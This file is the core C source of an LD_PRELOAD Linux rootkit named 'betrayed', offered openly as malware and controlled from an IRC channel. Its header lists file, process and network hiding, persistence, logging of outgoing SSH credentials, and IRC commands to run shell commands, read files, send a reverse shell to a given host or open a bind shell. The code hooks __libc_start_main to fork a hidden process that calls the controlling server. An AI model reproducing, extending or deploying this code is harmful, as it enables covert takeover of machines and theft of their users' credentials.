/*

     |          |                            |
     __ \   _ \ __|  __| _` | |   |  _ \  _` |
     |   |  __/ |   |   (   | |   |  __/ (   |
    _.__/ \___|\__|_|  \__,_|\__, |\___|\__,_|
                             ____/            

    LD_PRELOAD Linux rootkit controlled
    from an IRC channel!

    Rootkit:
      file hiding,
      process hiding,
      network hiding,
      installation persistence,
      outgoing ssh cred logging
    IRC commands:
      To use a command, send "<CMD NAME> <NICK/all> [any arguments]"
        "!EXEC", // executes given commands & sends resulting output to the channel.
        "!SSHL", // read outgoing ssh logs, send said logs to the channel.
        "!READ", // send file contents to the channel.
        "!REVR", // send a reverse shell to a given hort & port.
        "!BIND", // create a bind shell on given port.
        "!KILL", // remove the rootkit and all of its files and disconnect.
        "!DISC", // just disconnect. we will then reconnect when possible.
        "!INFO", // just send `uname -a` output to the channel.
        "!HELP", // send this command list to the channel.
        "!ADDR"  // send the address of the box to the channel. uses curl.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <termio.h>
#include <dirent.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <limits.h>
#include <fnmatch.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/netlink.h>

static int sockfd;

#include "hooks/prototypes.h"
#include "config.h"

#ifndef MASTER_NICK
#warning "no master nick specified in config.h"
#endif

#ifndef CHPASS
#warning "no channel password specified in config.h"
#endif

#define hook(func, sym) if(!func) func = dlsym(RTLD_NEXT, sym);

#include "utils/utils.h"
#include "hooks/hooks.h"

int init_betrayed(void){            /* this function is responsible for forking &       */
    int isroot = 0;                 /* hiding our process. making the connection to     */
#ifndef DM_ROOT                     /* the server, then interacting with it & joining   */
    if(getuid() != 0) return 0;     /* the channel specified, before handling commands. */
    else isroot = 1;
#endif
    if(isroot) reinstall();

    if(is_betrayed_alive()) return 0;       /* don't connect again... & don't */

    char *myname = cprocname();
    if(is_bad_proc(myname)){
        free(myname);
        return 0;
    }
    free(myname);

    pid_t pid = fork();
    if(pid == 0){
        if(isroot){   /* hide our new process now */
            setpgrp();
            setgid(MAGIC_GID);
        }
        chroot(INSTALL_DIR);

        sleep(BPROC_WAIT);
        sockfd = setup_connection(); /* exit(0) if we can't connect. */
        signal(SIGTERM, (sighandler_t)commit_termicide);

        /* interacts with the server & handles commands in channel. */
        betrayer(sockfd);
        return 1;
    }else if(pid < 0) return 1;
    return 0;
}

int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    if(init_betrayed())   /* should our main function return >0 for some    */
        kill_rk_procs();  /* reason, kill all present rootkit processes. */

    hook(o_libc_start_main, "__libc_start_main");
    return o_libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}